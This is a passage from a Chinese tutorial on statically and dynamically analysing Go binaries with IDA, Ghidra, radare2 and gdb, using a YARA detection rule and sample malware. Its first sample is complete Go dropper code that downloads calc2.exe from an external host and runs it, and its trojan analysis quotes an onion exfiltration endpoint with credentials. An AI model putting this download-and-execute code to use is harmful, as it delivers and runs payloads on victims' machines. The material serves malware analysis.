install命令加上-buildmode参数，可以实现动态链接\n原因二：Go编译时，编译器将很多debug信息编译进去。\n原因三：Go代码中引入了fmt包，间接引入了很多其他的包。\n使用runtime打印函数的话，和C编译的二进制文件大小差距就很小：\n此处也可以使用IDA比对前后两次样例，会发现数量函数有明显变化：\n文件大小的章节详见 golang语言编译的二进制可执行文件为什么比 C 语言大 （https://www.cnxct.com/why-golang-elf-binary-file-is-large-than-c/），该文作者详细地分析了Go编写的二进制可执行文件大于C的原因。\n元数据 从Go1.18开始，在buildinfo的表中提供了附加元数据，其中涉及编译器、链接器标志、GOOS/GOARCH环境变量值、git信息、以及有关主包、依赖包的包名称信息。所以Golang二进制的元数据也很有意思，在分析场景中可能会涉及。\nBuild ID https://go.dev/src/cmd/go/internal/work/buildid.go 中描述了GO二进制程序带有hash值——Build ID，是构建二进制中产生的一个标识。可以将其作为Go二进制程序的一种特征。\n可以使用Go的内置工具go tool buildid 、readelf、file 、strings 等方法查看：\n1 2 3 4 5 6 7 go tool buildid hello_Go readelf -n hello_Go file hello_Go strings -af hello_Go | grep -E \u0026#34;((\\\u0026#34;?)([a-zA-Z0-9_-]{20})\\/)(([a-zA-Z0-9_-]{20})\\/([a-zA-Z0-9_-]){20}\\/([a-zA-Z0-9_-]){20}(\\\u0026#34;?)$)\u0026#34; 也可以使用YARA规则进行识别，YARA规则可见 https://github.com/SentineLabs/AlphaGolang ：\nrule TTP_GoBuildID { meta: desc = \u0026#34;Quick rule to identify Golang binaries (PE,ELF,Macho)\u0026#34; author = \u0026#34;JAG-S @ SentinelLabs\u0026#34; version = \u0026#34;1.0\u0026#34; last_modified = \u0026#34;10.06.2021\u0026#34; strings: $GoBuildId = /Go build ID: \\\u0026#34;[a-zA-Z0-9\\/_-]{40,120}\\\u0026#34;/ ascii wide condition: ( (uint16(0) == 0x5a4d) or (uint32(0)==0x464c457f) or (uint32(0) == 0xfeedfacf) or (uint32(0) == 0xcffaedfe) or (uint32(0) == 0xfeedface) or (uint32(0) == 0xcefaedfe) ) and #GoBuildId == 1 } 版本号 不同Go版本，具有不同的特性，特别是在一些版本底层改变较大，编写、编译生成的二进制程序有一定的差异性。对于手动分析来说，知道Go二进制程序是用哪个Go版本编译是很重要的。一般来说，查看Go二进制程序是哪个Go版本，可使用以下两种方法：\ngo version [go binary] 查看二进制程序的字符串可找到 但如果Go的二进制程序被处理过，可能就无法使用内置的工具go version查看，如加壳。\n路径信息 GOROOT 是 Go 语言编译、工具、标准库等的安装路径。一般地，在编译的的时候，都会把 GOROOT 打包进去，并用于runtime.GOROOT() 函数。为了优化编译时的二进制，可以在编译的时候，使用如下命令去除路径信息：\n1 CGO_ENABLED=0 go build -v -a -ldflags \u0026#39;-s -w\u0026#39; -gcflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -asmflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -o ./main main.go 使用IDA可清晰看到去除路径信息的Golang二进制文件和未去除路径信息的二进制文件区别：\n在不同的系统架构下，可根据实际需要生成去除路径等信息的Golan编译程序：\n1 2 3 4 5 6 7 8 9 10 CGO_ENABLED=0 go build -v -a -ldflags \u0026#39;-s -w\u0026#39; -gcflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -asmflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -o ./main main.go CGO_ENABLED=0 go build -v -mod=vendor -trimpath -a -ldflags \u0026#39;-s -w\u0026#39; -gcflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -asmflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -o test main.go CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -v -mod=vendor -trimpath -a -ldflags \u0026#39;-s -w\u0026#39; -gcflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -asmflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -o counter_linux_amd64 main.go CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -v -mod=vendor -trimpath -a -ldflags \u0026#39;-s -w\u0026#39; -gcflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -asmflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -o counter_darwin_amd64 main.go CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -v -mod=vendor -trimpath -a -ldflags \u0026#39;-s -w\u0026#39; -gcflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -asmflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -o adwarecounter_win_amd64.exe main.go pcHeader结构体 pcHeader结构体 是 pclntab 的头。\n根据 https://docs.google.com/document/d/1lyPIbmsYbXnpNj57a261hgOYVpNRcgydurVQIyZOz_o/pub 描述可知，函数符号表、文件名表、函数结构体以及这些数据的偏移量引用的数据在内存中都是连续的，记录在pclntab( Program Counter Line Table，程序计数器行数映射表，也叫称为 Runtime Symbol Table) 上。该表将虚拟内存地址映射回最近的符号名称，用于生成带有函数和文件名的堆栈跟踪。所以在Golang程序的逆向工程中，pclntab对于恢复符号来说是很重要的一个切入点。\n官方的代码库中src/runtime/symtab.go对pcHeader结构体的定义如下：\npcHeader结构体的中文注释如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // pcHeader 包含了 pclntab 查询所需的数据。 type pcHeader struct { magic uint32 // 幻数，固定为 0xFFFFFFF0 pad1, pad2 uint8 // 填充字段，均为 0 minLC uint8 // 最小指令长度 ptrSize uint8 // 指针大小，以字节为单位 nfunc int // 模块中的函数数量 nfiles uint // 文件表中的条目数量 textStart uintptr // 该模块中函数入口 PC 偏移的基地址，等于 moduledata.text funcnameOffset uintptr // 从 pcHeader 到 funcnametab 变量的偏移量 cuOffset uintptr // 从 pcHeader 到 cutab 变量的偏移量 filetabOffset uintptr // 从 pcHeader 到 filetab 变量的偏移量 pctabOffset uintptr // 从 pcHeader 到 pctab 变量的偏移量 pclnOffset uintptr // 从 pcHeader 到 pclntab 变量的偏移量 } 其中：\nmagic： pclntab 的第一个字段是 uint32 的幻数值 pad1, pad2 ：第二个字段是两个0x00填充值 minLC ：最小指令长度。在填充值后跟一个给出指令大小量程的字节值，1 代表x86，4代表ARM ptrSize：第四个字段是 uintptr 类型的指针大小。以字节为单位，32bit 的值为 0x04，64 bit 的为 0x08 nfunc：模块中的函数数量 定位 pclntab 的方法：遍历查找magic值，从而确定pclntab的地址。然后遍历funcs表，得到func_struct，通过func_struct的name_offset字段获取函数名称，进而重命名函数。\n使用IDA自带的解析功能，可以清楚看到pclntab 头的排列情况：\nIDA7.6版本开始大大加强对Golang的解析度，此版本之前的需要借助第三方脚本或者手动解析的方法进行分析。\nhttps://github.com/goretk/gore/ https://github.com/goretk/redress https://github.com/sibears/IDAGolangHelper https://www.pnfsoftware.com/blog/analyzing-golang-executables/ https://github.com/strazzere/golang_loader_assist https://github.com/SentineLabs/AlphaGolang 幻数 在 https://github.com/golang/go/blob/master/src/debug/gosym/pclntab.go 中可见，不同版本Go有不同的magic值。在go1.16之前magic number的值为0xfffffffb，到go1.16的时候变为0xfffffffa, go1.18变为0xfffffff0，go1.20变为0xfffffff1：\ngo12magic = 0xfffffffb go116magic = 0xfffffffa go118magic = 0xfffffff0 go120magic = 0xfffffff1 当然，幻数的改变会导致一些老旧的Golang工具不再具有解析的通用性。\n样例分析1——分析POC程序 运用上文所述的理论知识，针对实际的程序例子进行分析。\n实验准备 编写测试代码，新建工程目录为blackss，并创建project1目录，在project1目录下创建conference.go和 download_exec.go；在工程目录下，创建example1.go文件:\n1 2 3 4 5 6 7 8 blackss ├── example1.go ├── go.mod └── project1 ├── conference.go └── download_exec.go 1 directory, 4 files example1.go的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;test/project1\u0026#34; ) func main() { fmt.Printf(\u0026#34;Running in main function!\\n\\n\u0026#34;) http.HandleFunc(\u0026#34;/submit\u0026#34;, project1.Conference) http.ListenAndServe(\u0026#34;:9999\u0026#34;, nil) } conference.go的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package project1 import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) func Conference(mywriter http.ResponseWriter, myreader *http.Request) { fmt.Println(\u0026#34;Running in Conference function!\u0026#34;) user := myreader.URL.Query().Get(\u0026#34;user\u0026#34;) fmt.Fprintf(mywriter, \u0026#34;The requester is: %s\\n\u0026#34;, user) fmt.Printf(\u0026#34;The requester is: %s\\n\\n\u0026#34;, user) if user != \u0026#34;alexandre\u0026#34; { Download_Exec(\u0026#34;calc2.exe\u0026#34;, \u0026#34;http://www.blackstormsecurity.com/conference/calc2.exe\u0026#34;) } } download_exec.go的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package project1 import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;time\u0026#34; ) func Download_Exec(filename string, website string) { fmt.Println(\u0026#34;Running in Download_Exec function!\u0026#34;) out, err := os.Create(filename) if err != nil { log.Panicln(err) } resp, err := http.Get(website) if err != nil { log.Panicln(err) } time.Sleep(10 * time.Second) if err != nil { log.Panicln(err) } io.Copy(out, resp.Body) resp.Body.Close() out.Close() fmt.Println(\u0026#34;Executing the payload!\u0026#34;) command := exec.Command(filename) err = command.Run() if err != nil { log.Panicln(err) } } go build example1.go命令编译程序，并查看编译后程序的版本信息和buildid：\n在cmd中运行程序，在浏览器访问http://127.0.0.1:9999/submit?user=alexandre则正常打印字符串，在浏览器访问http://127.0.0.1:9999/submit?user=borges则会下载执行计算器程序，符合实验准备的预期：\n定位函数 使用IDA打开该二进制程序，在HEX窗口查看example.exe文件，显示了该程序的buildID，程序的开头以FF 20开始:\n切换到IDA的汇编窗口查看：\n此时使用快捷键A，更改数据类型为字符串：\n当IDA标识错误时,可以使用A\\C\\D\\U进行手动标注修改：\nA 快捷键用于触发IDA Pro的自动分析功能。IDA Pro会尝试自动识别函数、变量、字符串等，并进行标记。这有助于在逆向工程过程中快速了解程序的结构和功能 C 快捷键用于将当前光标处的地址视图切换为代码视图。在IDA Pro中，可以查看不同的视图，比如反汇编视图、数据视图等。按下C键后，将切换到当前地址的反汇编代码视图，方便进行分析和编辑。 D 快捷键用于将当前光标处的地址视图切换为数据视图。数据视图显示了当前地址的数据内容，如字节、字、字符串等。按下D键后，将切换到当前地址的数据视图，有助于查看和分析数据。 U 捷键用于将当前函数或指定地址的未定义字节（Undefined Bytes）标记为代码。在逆向工程中，经常会遇到未定义的代码片段，IDA Pro无法识别这些未定义的字节，IDA Pro将尝试将未定义的字节解释为代码，有助于完善程序的分析和反汇编结果。 根据前文获得的go版本信息，可以在IDA里直接二进制搜索go1.17.2搜索到：\n在IDA搜索Go1.17的magic幻数FFFFFFFA，Search-\u0026gt;Sequence of bytes（快捷键Alt+B）搜索二进制字符串FFFFFFFA，可得到：\n双击跳转到006FB2A0地址处：\n同样的，在Ghidra上搜索。Linux上的老版本1.16编译出来的二进制程序是有gopclntab节区，但是Windows 上的Go1.17版本的编译出来的没有gopclntab节区：\n在构建可执行 ELF 文件时，目前还是默认使用 -buildmode=exe，而从 2019 年 4 月底 Go 语言官方 Change Log 203606 开始，在 Windows 上构建可执行 PE 文件时，则会默认使用 -buildmode=pie, 是没有 .gopclntab 这个 Section 的，而是多了一些重定向相关的 Section\n这时，可以在Ghidra也可以用memory(快捷键S)搜索FFFFFFFA,可以定位到该幻数：\n计算buildid函数的地址，pcheader+offset为6FB2A0+40=6FB2E0：\n函数表(func table)的起始地址为 (pclntab_addr + 8)，第一个元素( uintptr N) 代表函数的个数。函数名称表的起始地址为(pclntab_addr+8)，即 6FB2D8+8=6FB2E0：\n在pcHeader中的pclntab地址处按快捷键D转换出pclntab的偏移值是0BD2A0h：\npcHeader + pclnOffset=Function Table指向pclntab，也就是Go用来描述函数信息的地方 ， 计算地址6FB2A0+0BD2A0=7B8540:\n使用IDA的快捷键G跳转到7B8540处，该结构由funcAddress + funcMetaAddress两部分组成。\npcHeader + pclnOffset + funcMetaAddress指向Go的_func结构，具体见symtab.go和文件的type pcHeader struct。\n此src/debug/gosym/symtab.go已经没有type _func struct可以在https://docs.google.com/document/d/1lyPIbmsYbXnpNj57a261hgOYVpNRcgydurVQIyZOz_o/pub 的文档中找到Go 1.2 运行时符号信息，并查看\nhttps://sourcegraph.com/github.com/golang/go/-/blob/src/runtime/runtime2.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 type _func struct { entryoff uint32 // start pc, as offset from moduledata.text/pcHeader.textStart nameoff int32 // function name args int32 // in/out args size deferreturn uint32 // offset of start of a deferreturn call instruction from entry, if any. pcsp uint32 pcfile uint32 pcln uint32 npcdata uint32 cuOffset uint32 // runtime.cutab offset of this function\u0026#39;s CU funcID funcID // set for certain special runtime functions flag funcFlag _ [1]byte // pad nfuncdata uint8 // must be last, must end on a uint32-aligned boundary } Function Struct 在 Russ Cox 的《Go 1.2 Runtime Symbol Information》有介绍，这个函数元数据表存储这个函数名的偏移值，通过这个元数据表可以恢复函数名：\n1 2 3 4 5 6 7 8 9 10 11 12 struct Func { uintptr entry; // start pc int32 name; // name (offset to C string) int32 args; // size of arguments passed to function int32 frame; // size of function frame, including saved caller PC int32 pcsp; // pcsp table (offset to pcvalue table) int32 pcfile; // pcfile table (offset to pcvalue table) int32 pcln; // pcln table (offset to pcvalue table) int32 nfuncdata; // number of entries in funcdata list int32 npcdata; // number of entries in pcdata list }; 描述函数信息的结构由funcAddress + funcMetaAddress两部分组成，则funcMetaAddress为12598，即是Func Name String Offset 为 0x12598\npcHeader + pclnOffset + funcMetaAddress指向Go的_func结构，即6FB2A0+0BD2A0+12598=7CAAD8，在7CAAD8处：\n具体见symtab.go文件的type pcHeader struct。通过_func中的entry也就是funcAddress和nameOff就可以把函数地址和函数名结合起来\n此时7CAAD8的偏移值为401000,该函数的入口点就是401000:\n进入该函数内部：\nGOROOT 直接使用IDA快捷键Alt+T搜索runtime_defaultGoROOT得到C:\\\\Program Files\\\\Go：\n垃圾回收 在Golang程序中，垃圾回收器会被调用很多次：\n本实验目的不在于gc分析，就不对浪费垃圾回收相关操作进行其它篇幅叙述：\n主函数 回顾main()函数的源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;test/project1\u0026#34; ) func main() { fmt.Printf(\u0026#34;Running in main function!\\n\\n\u0026#34;) http.HandleFunc(\u0026#34;/submit\u0026#34;, project1.Conference) http.ListenAndServe(\u0026#34;:9999\u0026#34;, nil) } 图中主函数中的部分指令解释：\n运行时函数在设置局部栈帧前，检查是否有足够的栈空间 os包中的os.File实现了io.Writer接口(rax)，标准输出Stdout(rbx)，并且定义为全局变量。此外，rcx保存字符串，edi包含字符串大小 fmt包中的Printf()函数 Go中的指令结构： 字符串内容(char*) 大小(qword) 按空格键切换反汇编窗口，得到汇编视图:\nsmall allocations是直接通过mcache来分配的。对于tiny allocations的分配，有一个微型分配器tiny allocator来分配，分配的对象都是不包含指针的，例如一些小的字符串和不包含指针的独立的逃逸变量等。small allocations的分配，就是mcache根据对象的大小来找自身存在的大小相匹配mspan来分配。\n当mcach没有可用空间时，会从mcentral的 mspans 列表获取一个新的所需大小规格的mspan。\n是字符串(string)的运行时表现:\nData：存放指针，其指向具体的存储数据的内存区域。 Len：字符串的长度 1 2 3 4 type StringHeader struct { Data uintptr Len int } Conference函数 回顾Conference()函数的源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package project1 import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) func Conference(mywriter http.ResponseWriter, myreader *http.Request) { fmt.Println(\u0026#34;Running in Conference function!\u0026#34;) user := myreader.URL.Query().Get(\u0026#34;user\u0026#34;) fmt.Fprintf(mywriter, \u0026#34;The requester is: %s\\n\u0026#34;, user) fmt.Printf(\u0026#34;The requester is: %s\\n\\n\u0026#34;, user) if user != \u0026#34;alexandre\u0026#34; { Download_Exec(\u0026#34;calc2.exe\u0026#34;, \u0026#34;http://www.blackstormsecurity.com/conference/calc2.exe\u0026#34;) } } 点击61F11A处的off_6A16D8跳转到，到达61EC00处：\n按IDA的快捷键空格键得到Conference函数图形视图：\n根据指令流，对指令做一些分析：\n将当前指令/数据的立即操作数类型转换为十六进制数：快捷键：Q\nGo 语言中读取 map 有两种语法：带 comma 和 不带 comma。当要查询的 key 不在 map 里，带 comma 的用法会返回一个 bool 型变量提示 key 是否在 map 中；而不带 comma 的语句则会返回一个 key 类型的零值。如果 key 是 int 型就会返回 0，如果 key 是 string 类型，就会返回空字符串。https://www.bookstack.cn/read/qcrao-Go-Questions/map-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E4%B8%A4%E7%A7%8D%20get%20%E6%93%8D%E4%BD%9C.md\n接着分析剩下的代码流，该处主要功能是获取用户输入参数，并且校验参数的正确性：\n1 2 fmt.Fprintf(mywriter, \u0026#34;The requester is: %s\\n\u0026#34;, user) fmt.Printf(\u0026#34;The requester is: %s\\n\\n\u0026#34;, user) 在Go中，一个接口类型定义了一个方法集，接口会提供方法来指定对象的行为、类型,不过最终是由具体的对象来实现方法。这里就是使用string来实现类型转换：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func convTstring(val string) (x unsafe.Pointer) { if val == \u0026#34;\u0026#34; { x = unsafe.Pointer(\u0026amp;zeroVal[0]) } else { x = mallocgc(unsafe.Sizeof(val), stringType, true) *(*string)(x) = val } return 可参见https://golang.org/src/runtime/iface.go 和 https://juejin.cn/post/6844903965541285896\n将当前指令/数据的立即操作数类型转换为字符，快捷键：R；\nSSE (Streaming SIMD Extensions)，该扩展加入了新的 xmm 寄存器集合：xmm0，xmm1，...，xmm15。这些寄存器为 128 位宽，常用于两种任务：\n浮点数运算；以及 SIMD 指令集(这种指令一条指令可以操作多条数据) 根据校验的结果进行操作，校验成功则下载所给地址的calc2.exe：\ndownload_exec函数 回顾download_exec()函数的源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package project1 import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;time\u0026#34; ) func Download_Exec(filename string, website string) { fmt.Println(\u0026#34;Running in Download_Exec function!\u0026#34;) out, err := os.Create(filename) if err != nil { log.Panicln(err) } resp, err := http.Get(website) if err != nil { log.Panicln(err) } time.Sleep(10 * time.Second) if err != nil { log.Panicln(err) } io.Copy(out, resp.Body) resp.Body.Close() out.Close() fmt.Println(\u0026#34;Executing the payload!\u0026#34;) command := exec.Command(filename) err = command.Run() if err != nil { log.Panicln(err) } } 从Conference函数中的call blackss_project1_Download_Exec指令进入download_exec函数。\n主函数中的Create()函数实际上是使用OpenFile()函数实现的，可在Go源码的os.File （https://go.dev/src/os/file.go） 包中查看到：\n1 2 3 func Create(name string) (*File, error) { return OpenFile(name, O_RDWR|O_CREATE|O_TRUNC, 0666) } 此时rbx拥有err变量，使用test指令判定是文件是否创建成功:\n1 2 3 4 5 6 7 out, err := os.Create(filename) if err != nil { log.Panicln(err) } 接下来的程序流，是处理HTTP请求和响应：\n1 2 3 4 5 6 7 8 9 10 11 12 resp, err := http.Get(website) if err != nil { log.Panicln(err) } time.Sleep(10 * time.Second) if err != nil { log.Panicln(err) } io.Copy(out, resp.Body) resp.Body.Close() out.Close() 接下来程序流，就是运行下载下来的文件：\n1 2 3 4 5 6 fmt.Println(\u0026#34;Executing the payload!\u0026#34;) command := exec.Command(filename) err = command.Run() if err != nil { log.Panicln(err) } 至此，运用上文所描述的理论知识，大致将所准备的go源码编译的程序进行了静态分析。\n样例分析2——静态分析Trojan 运用上文所述的理论知识，针对实际的程序例子进行分析。使用的\n样本文件SHA256 hash: 4961954c47ef2395dd73b8cc4bb36827f71e08a13f9ec4cc1daba51715334fc9\n使用 https://github.com/SentineLabs/AlphaGolang 中的YARA脚本识别Golang二进制的BuildID（yara -s 0.identify_go_binaries.yara 4961954c47ef2395dd73b8cc4bb36827f71e08a13f9ec4cc1daba51715334fc9.exe）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 rule TTP_GoBuildID { meta: desc = \u0026#34;Quick rule to identify Golang binaries (PE,ELF,Macho)\u0026#34; author = \u0026#34;JAG-S @ SentinelLabs\u0026#34; version = \u0026#34;1.0\u0026#34; last_modified = \u0026#34;10.06.2021\u0026#34; strings: $GoBuildId = /Go build ID: \\\u0026#34;[a-zA-Z0-9\\/_-]{40,120}\\\u0026#34;/ ascii wide condition: ( (uint16(0) == 0x5a4d) or (uint32(0)==0x464c457f) or (uint32(0) == 0xfeedfacf) or (uint32(0) == 0xcffaedfe) or (uint32(0) == 0xfeedface) or (uint32(0) == 0xcefaedfe) ) and #GoBuildId == 1 } 使用Cutter查看目标文件的文件信息：\n使用IDA分析样本，进入main_main 函数：\n在 Go 语言中，ArbitraryUserPointer 通常用于与 C 语言交互，如使用 cgo 时，允许将任意类型的指针（例如 C 语言中的 void*）传递给 Go 函数。\n选中main_main函数，点击View -\u0026gt; Open subviews -\u0026gt; Function calls ：\n显示所有的函数调用：\n在main.main函数中，使用UserHomeDir() 函数返回当前用户的主目录，在Windows系统中是使用%USERPROFILE%获取当前用户目录；path.filepath.Join函数将路径元素连接成一个单一的路径，在Windows上返回一个UNC路径；os.MkdirAll()创建一个命名路径和所有必要的父目录(类似于Linux/Unix上的mkdir -p)\n通常使用下图类似的代码结构创建字符串：\n然后使用快捷键Alt+Q 和T 对一个结构体偏移量进行更改应用。（Alt + Q 将某一组数据定义为某结构体）\n虽然该样例主要是说明静态分析，但是可以拓展一下，重命名的函数可以使用以下插件转移到x64dbg中：\nLabeless: https://github.com/a1ext/labeless x64dbgida: https://github.com/x64dbg/x64dbgida Golang可以使用关键字go 创建goroutine，goroutine消耗很少的堆栈空间，并根据需要分配堆空间，其会在同一地址空间内与其他goroutines并发执行。\n拓展：mian gorutine 如何创建\n1 2 3 4 5 6 7 // src/runtime/proc.go // 创建一个新的 g，运行 fn 函数，需要 siz byte 的参数 // 将其放至 G 队列等待运行 // 编译器会将 go 关键字的语句转化成此函数 //go:nosplit func newproc(siz int32, fn *funcval) 启动了一个 goroutine 的时候，一定要知道，在 Go 编译器的作用下，这条语句最终会转化成 newproc 函数。\n因此，newproc 函数需要两个参数：一个是新创建的 goroutine 需要执行的任务，也就是 fn，它代表一个函数 func；还有一个是 fn 的参数大小。\nruntime.main函数没有参数，所以其构造 newproc 函数调用栈的时候，第一个参数是 0\n点击00000000006D7645 地址进入 main_lockRun 函数：\n点击00000000006D764A 进入 main.getClientDetails 函数：\n点击00000000006D65301地址处的os_user_Current 进入os_user_Current 函数：\nruntime.typedmemmove 将发送的数据拷贝到缓冲区，类似于C中的memcpy()\nsync包有一个Once结构体和对象，它保存一个类型互斥锁字段(m)，doSlow(f func())函数对m使用Lock()，并保证它返回时，已经完成。简而言之，doSlow实现了同步，如果传入的函数没有执行过，会调用sync.Once.doSlow执行传入的函数\n在os.user.Current() 函数中的00000000006D5901 可以看到恶意程序的一些系统函数调用：\n使用syscall_OpenCurrentProcessToken打开与当前进程关联的访问令牌 使用syscall_Token_getInfo从访问令牌中获取信息: func (t Token) getInfo(class uint32, initSize int) 使用 GetTokenInformation( )实现 GetTokenInformation(t Token, infoClass uint32, info *byte, infoLen uint32,returnedLen *uint32) (err error) = advapi32.GetTokenInformation 在os.user.Current函数 00000000006D59BC 地址处的函数调用情况：\nsyscall___ptr_SID__String：syscall包的String可以使用ConvertSidToStringSid( )函数将sid转换为字符串 syscall_Token_GetUserProfileDirectory：这个函数通过给定的口令检索userprofile目录路径（返回指定用户的userprofile路径） os_user_lookupUsernameAndDomain：检索给定SID的用户名和域 在main_getClientDetails 的00000000006D653F 地址处调用了os.hostname ，进入os.hostname 函数：\nmake函数初始化有三个参数，第一个是类型，第二个长度，第三个容量，容量要大于等于长度。slice的make初始化调用的是底层的runtime.makeslice函数。\n切片是一种动态大小的数组(无固定的长度)，其典型的符号就是[]T，T指定元素的类型：\n1 func makeslice(et *_type, len, cap int) unsafe.Pointer {...} syscall.GetComputerName 函数可以检索与本地计算机关联的NetBIOS或DNS名:\n1 GetComputerNameEx(nameformat uint32, buf *uint16, n *uint32) (err error) = GetComputerNameExW 在main_getClientDetails 的00000000006D6557 地址处调用了main.getIP ，进入main.getIP函数：\n不幸的是，在Golang的早期版本中查找字符串并不容易(它们被分组了)。然而，花些时间还是可以梳理出……为了确定字符串在哪里结束，我使用了以下几行\n1 2 mov [rsp+60h+var_58], rax mov [rsp+60h+var_50], 21h ; \u0026#39;!\u0026#39; 继续跟随main.getIP代码流到00000000006D63D9：\nGo中的接口类型在某些方面类似于其他语言，定义了一些需要实现的方法。其他数据类型持有相同签名方法，将会被视为与该接口的相同类型。方法签名由方法名、方法参数、返回值三部分组成。\nReadAll对 r 进行读取， 直到发生错误或者遇到 EOF 为止， 然后返回被读取的数据。 一次成功的读取将返回 nil 而不是 EOF 作为 err 的值： 这是因为 ReadAll 的定义就是要读取 r 直到遇到 EOF 为止， 所以它不会把读取到的 EOF 当做错误， 也不会向调用者返回它：\n1 func ReadAll(r io.Reader) ([]byte, error) 双击IDA的函数栏中的main_getClientDetails，进入00000000006D7A90 地址处：\n文件从互联网下载 downloadFile()是通过net.http.Get()函数：func Get(url string) (resp *Response, err error) Get()方法是通过func NewRequestWithContext(ctx context.Context, method, url string, body io.Reader) 通过显示的字符串可知该程序通过cmd /c start \u0026lt;downloaded file\u0026gt; 实现文件下载 Command函数为func Command(name string, arg ...string) *Cmd ，返回一个Cmd结构体，使用os.exec.Cmd.Run()执行目标程序的参数 从main函数进入main.handleFileUploadURL() 函数，定位到该程序：使用post方法传输json文件到hxxps://gi74qcmwmxoq4xun[.]onion[.]ws/fujson ，使用的登录口令为 用户名: uwangle密码为vzigzag。\n双击IDA的函数栏中的main_handleScreenshot，进入00000000006D65F0 地址处。经分析，得出该程序使用第三方扩展包（https://github.com/kbinani/screenshot ）进行桌面程序截图：\n样例分析3——动态分析Miner 运用上文所述的理论知识，针对实际的程序例子进行分析。选用样例的文件SHA-256 Hash为73dec430b98ade79485f76d405c7a9b325df7492b4f97985499a46701553e34a\n使用rabin2命令查看样本是否有壳：\n环境中如果没有rabin2命令，可以安装radare2，如sudo apt-get install radare2\n查看恶意样本的基本信息：\n1 rabin2 -I 73dec430b98ade79485f76d405c7a9b325df7492b4f97985499a46701553e34a 通过下列命令列出恶意程序调用的函数：\n1 2 3 4 chmod a+x \u0026lt;ELF_FILE\u0026gt; r2 -d \u0026lt;ELF_FILE\u0026gt; #调试文件或进程 aaa #自动分析 afl | grep \u0026#39;main\u0026#39; (for listing functions in radare2) 该恶意程序是通过AES加密，且在内存中解密运行：\n使用strace 命令捕捉和记录恶意程序的系统调用和被进程接收的信号：\n1 strace -s 2048 ./73dec430b98ade79485f76d405c7a9b325df7492b4f97985499a46701553e34a 运行目标程序，并在执行过程中，只跟踪文件描述符为 3 的 write 系统调用，并将输出详细写入到 test.txt 文件中。可以看到目标程序写入5957056字节的数据，从已有的标志上看似乎写入的是ELF文件：\n1 strace -e write=3 -o test.txt ./73dec430b98ade79485f76d405c7a9b325df74 接下来，使用gdb调试恶意样本程序：\n1 2 3 gdb ./73dec430b98ade79485f76d405c7a9b325df7492b4f97985499a46701553e34a (gdb) info functions 查看恶意样本的函数情况：\n使用b main.main 设置断点，并使用r运行该程序：\n使用b main.runFromMemory 对r2查到的函数main.runFromMemory 进行下断点，并设置调试子进程set follow-fork-mode child:\n用set follow-fork-mode child的目的是告诉 gdb 在目标应用调用fork之后接着调试子进程而不是父进程，因为在 Linux 中fork系统调用成功会返回两次，一次在父进程，一次在子进程。\n使用b syscall.write 对系统调用写入函数进行下断点：\n1 b syscall.write 键入c 十余次之后，执行到main.runFromMemory 函数，可以发现恶意程序将要把挖矿程序写入到内存中：\n此时使用p p 打印值和内存地址，然后根据文件在内存中的地址和文件长度进行dump，把内存中的文件dump出来：\n1 2 p p #打印变量 dump binary memory \u0026lt;path\u0026gt; \u0026lt;array\u0026gt; (array+len) 导出的elf文件SHA1值为6feda48d24a9a6c4d00d24fdbac41def7a237caa，威胁情报已将其标记为矿工：\n汇编 GO汇编语言不是一门独立的语言，Go编译器输出的汇编代码不对应某种真实的硬件架构，Go汇编器会使用这种伪汇编代码为目标硬件生成具体的机器指令。\nGo的汇编是基于Plan9汇编逐渐发展演化，而Plan9汇编是不同于 X86 和 AT\u0026amp;T，它是源自贝尔实验室的分布式操作系统Plan9（Plan9汇编可参阅 A Manual for the Plan 9 assembler）。Go汇编代码其中一些特点：\n在 plan9 汇编中，常数用 $num 表示，可以为负数，默认情况下为十进制 操作数顺序不同，和X86的相反，和AT\u0026amp;T 类似 操作数大小表示法不同，数据传递的长度是由 MOV 的后缀决定的， 如 MOVQ $0x10, AX Go的汇编中，为简化汇编代码编写，引入了4个寄存器，分别是PC、FP、SP、SB 伪寄存器。 PC寄存器（Program Counter）：实为IP（Instruction Pointer）的别名，指令指针寄存器 FP寄存器（Frame Pointer）：栈帧指针寄存器，快速访问函数的参数和返回值 SP寄存器（Stack Pointer）：栈指针寄存器，指向栈顶 SB寄存器（Static base 